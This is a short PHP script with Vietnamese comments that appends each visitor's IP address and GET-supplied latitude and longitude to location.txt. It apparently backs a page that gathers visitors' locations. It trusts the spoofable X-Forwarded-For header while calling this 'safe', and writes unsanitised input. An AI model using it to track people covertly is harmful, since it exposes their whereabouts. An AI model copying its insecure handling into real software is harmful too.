<?php
// Hàm lấy IP an toàn
function getVisitorIp() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

$ip = getVisitorIp();
$lat = $_GET["lat"];
$long = $_GET["long"];

$myfile = fopen("location.txt" , "a"); // Dùng "a" để ghi tiếp vào cuối file thay vì ghi đè
$txt = "IP: " . $ip . " | Lat: " . $lat . " | Long: " . $long . "\n";
fwrite($myfile, $txt);
fclose($myfile);
?>
